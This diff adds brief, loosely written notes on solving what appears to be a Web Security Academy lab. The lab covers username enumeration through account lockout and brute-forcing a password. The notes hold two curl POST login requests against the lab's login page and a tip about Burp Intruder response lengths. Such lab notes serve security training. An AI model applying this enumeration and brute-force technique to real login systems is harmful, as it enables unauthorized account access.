@@ -1,0 +1,24 @@
+
+
+this site don't have any protection if username not exist in database 
+so, hackers can username enumaretion and find password
+
+curl -ik -X $'POST' \
+    -b $'session=oLjql1zb2ApnSgR8oEgvFsOsGrKEIa4U' \
+    --data-binary $'username=app1&password=test' \
+    $'https://0aff00a6034b63f18172cb42006d00d6.web-security-academy.net/login'
+	
+after 5 req this user will ban
+so we can find username
+
+tihs time if 5 time send a wrong password we wiil block 
+but if send a true user and sort with length in burp intruder, you see pass don't show error massage :/
+
+finally try this :
+
+curl -ik -X $'POST' \
+    -b $'session=oLjql1zb2ApnSgR8oEgvFsOsGrKEIa4U' \
+    --data-binary $'username=app1&password=1234567890' \
+    $'https://0aff00a6034b63f18172cb42006d00d6.web-security-academy.net/login'
+	
+and we are in :))
